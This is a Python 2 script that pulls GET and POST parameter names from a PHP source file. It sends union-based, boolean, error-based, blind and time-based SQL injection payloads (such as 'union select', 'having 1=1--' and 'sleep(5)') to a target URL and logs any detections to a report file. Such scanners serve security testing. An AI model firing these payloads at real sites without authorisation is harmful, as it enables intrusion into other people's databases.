import httplib
import urllib, urllib2
import sys
import time

class SQL:
    def fileopen(self,path):
        global postl
        postl = []
        f = open(path,'r')
        get = []
        while 1:
            line = f.readline()
            if not line: break
            p = line.find('$_GET')
            e=p
            param=''
            if p!=-1 :
                while 1:
                    if(line[p]=='"'): break
                    if(line[p]=="'"): break
                    p=p+1
                e=p+1
                while 1:
                    if(line[e]=='"'): break
                    if(line[e]=="'"): break
                    e=e+1
                param = line[p+1:e]
                get.append(param)
            p = line.find('$_POST')
            e=p
            param=''
            if p!=-1 :
                while 1:
                    if(line[p]=='"'): break
                    if(line[p]=="'"): break
                    p=p+1
                e=p+1
                while 1:
                    if(line[e]=='"'): break
                    if(line[e]=="'"): break
                    e=e+1
                param = line[p+1:e]
                postl.append(param)

        get = list(set(get))
        postl = list(set(postl))
        extra = '?'
        for i in range(len(get)):
            extra = extra + get[i] + '=&'
        extra = extra[0:-1]
        return extra
    def proc(self,url,path):
        f=open('sqlreport.txt','w')
        gettest=1
        issp=1
        post = ''
        getp = url.find('?')
        if getp==-1:
            f.write('There are no GET parameters. GET test will be skipped.\n')
            gettest=0   
        if not postl:
            issp=0
        else: post = postl[0]
        print postl
        if gettest==1:
            get = ''
            if(getp==-1):
                dest=url
            else:
                dest = url[0:getp]
                get = url[getp:]
            data1 = ''
            payload = ' union select 1'
            for i in range(2,10):
                getlist = get.split('=')
                payload += "," + str(i)
                req = urllib2.Request(dest+getlist[0]+'='+str(-3789)+urllib.quote(payload+" #"))
                response = urllib2.urlopen(req)
                data2 = response.read()
                if data1!=data2 and i!=2:
                    f.write('Union SQL injection #' + str(i) + ' DETECT\n')
                    break
                data1=data2
            
            payload = ' and substring(version(),1,1)='
            for i in range(2,10):
                req = urllib2.Request(dest+get+urllib.quote(payload+ str(i)))
                response = urllib2.urlopen(req)
                data2 = response.read()
                if data1!=data2 and i!=2:
                    f.write('Boolean based SQL injection DETECT('+str(i)+')\n')
                    break
                data1=data2
            
            req = urllib2.Request(dest+get+urllib.quote(" having 1=1--"))
            response = urllib2.urlopen(req)
            data1 = response.read()
            req = urllib2.Request(dest+get+urllib.quote("' having 1=1--"))
            response = urllib2.urlopen(req)
            data2 = response.read()
            if data1!=data2:
                f.write('Error based SQL injection DETECT\n')
            
            req = urllib2.Request(dest+get+urllib.quote(' and 1=1'))
            response = urllib2.urlopen(req)
            data1 = response.read()
            req = urllib2.Request(dest+get+urllib.quote(' and 1=0'))
            response = urllib2.urlopen(req)
            data2 = response.read()
            if data1!=data2:
                f.write('Blind SQL injection DETECT\n')
            

            t1=time.time()
            req = urllib2.Request(dest+get)
            response = urllib2.urlopen(req)
            data1 = response.read()
            t2=time.time()
            interval1 = t2-t1
            t1=time.time()
            req = urllib2.Request(dest+get+urllib.quote(";waitfor delay '00:00:01'"))
            response = urllib2.urlopen(req)
            data2 = response.read()
            t2=time.time()
            interval2 = t2-t1

            if interval2-interval1>0.9:
                f.write('Time based SQL injection DETECT\n')

        if issp==1:
            data1=''
            for i in range(2,10):
                payload = post + '= and substring(version(),1,1)=' + str(i)
                req = urllib2.Request(url,payload)
                response = urllib2.urlopen(req)
                data2 = response.read()
                if len(data1)!=len(data2) and i!=2:
                    f.write('Boolean based SQL injection DETECT('+str(i)+')\n')
                    break
                data1 = data2
                
            payload = post + "=, sleep(5)"
            t1=time.time()
            req = urllib2.Request(url,payload)
            response = urllib2.urlopen(req)
            data1 = response.read()
            t2=time.time()

            if t2-t1>4.5:
                f.write('Time based SQL injection DETECT')
                    

        print '\nDone'
